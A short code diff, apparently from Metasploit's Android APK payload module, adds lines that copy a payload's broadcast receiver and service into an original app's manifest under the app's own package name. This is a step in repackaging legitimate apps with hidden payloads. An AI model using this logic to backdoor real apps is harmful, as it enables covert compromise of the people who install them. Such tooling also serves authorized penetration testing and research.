@@ -107,3 +107,14 @@ class MSF::Payload::Apk
         original_permissions.before(permission_xml)
       end
     end
+
+    application = original_manifest.at_xpath('/manifest/application')
+    receiver = payload_manifest.at_xpath('/manifest/application/receiver')
+    service = payload_manifest.at_xpath('/manifest/application/service')
+    receiver.attributes["name"].value = package + '.' + main_broadcast_receiver
+    receiver.attributes["label"].value = main_broadcast_receiver
+    service.attributes["name"].value = package + '.' + main_service
+    application << receiver.to_xml
+    application << service.to_xml
+
+    
